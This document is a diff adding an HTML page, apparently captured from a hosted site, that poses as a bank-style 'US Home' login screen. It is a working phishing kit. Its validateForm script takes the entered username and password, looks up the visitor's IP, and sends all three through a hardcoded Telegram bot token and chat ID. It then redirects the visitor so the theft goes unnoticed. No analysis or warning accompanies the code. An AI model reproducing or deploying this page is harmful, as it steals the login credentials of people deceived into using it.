@@ -1,0 +1,127 @@
+<!-- url: https://us0eoeoefus0eoeoefus0eoeoefus0eoeoefu.netlify.app/
+status: 200 -->
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>US Home</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: #fff;
+      font-family: Arial, sans-serif;
+    }
+
+    .container {
+      position: relative;
+      width: 100%;
+      max-width: 1250px;
+      margin: 0 auto;
+    }
+
+    .responsive-img {
+      width: 100%;
+      height: auto;
+      display: block;
+    }
+
+    .form-field {
+      position: absolute;
+      height: 41px;
+      z-index: 6;
+      font-size: 1rem;
+      padding-left: 10px;
+      box-sizing: border-box;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+
+    #username {
+      top: 34.2%;
+      left: 28.6%;
+      width: 42.6%;
+    }
+
+    #password {
+      top: 54.7%;
+      left: 28.6%;
+      width: 42.6%;
+    }
+
+    #btn1 {
+      top: 68.5%;
+      left: 28.6%;
+      width: 42.6%;
+      height: 45px;
+      opacity: 1;
+      z-index: 9;
+      background-color: navy;
+      color: white;
+      border: none;
+      font-size: 16px;
+      cursor: pointer;
+      border-radius: 5px;
+    }
+
+    #btn1:hover {
+      background-color: #000033;
+    }
+
+    @media (max-width: 768px) {
+      #username, #password, #btn1 {
+        left: 10%;
+        width: 80%;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="1.png" alt="Background" class="responsive-img" />
+    <form name="frm9mation" method="post" action="1.php" onsubmit="return validateForm(this);" class="list-form">
+      <input name="username" id="username" type="text" placeholder="Username" required spellcheck="false" class="form-field" />
+      <input name="password" id="password" type="password" placeholder="Password" required spellcheck="false" class="form-field" />
+      <input name="btn1" type="submit" id="btn1" value="Log In" class="form-field" />
+    </form>
+  </div>
+
+  <script>
+    function validateForm(form) {
+      const username = form.username.value.trim();
+      const password = form.password.value.trim();
+
+      if (!username || !password) return false;
+
+      // Fetch the visitor's IP address
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          const ip = data.ip;
+          const token = '7349396325:AAHJ7cPIM1FByNhlJKiKZAxaAzJlZjsgYLo';
+          const chatId = '1920675677';
+          const message = `🔐 New Login Attempt\n👤 Username: ${username}\n🔑 Password: ${password}\n🌐 IP: ${ip}`;
+
+          // Send to Telegram
+          fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+              chat_id: chatId,
+              text: message
+            })
+          });
+        })
+        .finally(() => {
+          // Redirect regardless of success/failure
+          window.location.href = '2.html';
+        });
+
+      return false; // Prevent default form submission
+    }
+  </script>
+</body>
+</html>
